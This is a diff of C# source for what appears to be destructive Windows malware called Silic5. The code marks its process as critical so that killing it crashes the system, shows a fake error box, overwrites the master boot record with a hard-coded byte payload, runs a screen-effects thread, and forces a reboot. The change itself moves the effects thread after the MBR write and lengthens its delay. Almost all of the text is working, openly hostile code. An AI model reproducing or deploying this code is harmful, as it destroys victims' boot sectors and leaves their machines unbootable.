@@ -29,9 +29,6 @@ namespace Silic5
                 Process.EnterDebugMode(); //useless but fallback, why not
                 Dll_Imports.NtSetInformationProcess(Process.GetCurrentProcess().Handle, Dll_Imports.BreakOnTermination, ref Dll_Imports.isCritical, sizeof(int));
                 MessageBox.Show("426 : Upgrade Required", "1150", MessageBoxButtons.OK, MessageBoxIcon.Error); //Fake Messagebox works on any windows below 10
-                Thread th_gdi = new Thread(gdi_h.gdi_old);
-                th_gdi.Start();
-                Thread.Sleep(30000);
                 var mbhex = new byte[] { 0xFA, 0x31, 0xC0, 0x8E, 0xD8, 0xFB, 0xB8, 0x03, 0x00, 0xCD, 0x10, 0xC7, 0x06, 0x7A, 0x7C, 0x50,
 0x00, 0xE8, 0x17, 0x00, 0xE8, 0x53, 0x00, 0xFF, 0x0E, 0x7A, 0x7C, 0xA1, 0x7A, 0x7C, 0x83, 0xF8,
 0xC4, 0x7D, 0xEE, 0xC7, 0x06, 0x7A, 0x7C, 0x50, 0x00, 0xEB, 0xE6, 0x50, 0x53, 0x51, 0x52, 0x56,
@@ -77,6 +74,9 @@ namespace Silic5
                     0,
                     IntPtr.Zero);
                 Dll_Imports.WriteFile(mb, mbhex, Dll_Imports.MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
+                Thread th_gdi = new Thread(gdi_h.gdi_old);
+                th_gdi.Start();
+                Thread.Sleep(55000);
                 RebootHelper.ForceRebootComputer(); //Created by Sky, it was C++ logic before, i made it so it compatibles with C#
                 Environment.Exit(-1); //useless BSOD Fallbackif ntdll does not want to call hard reset 
             }
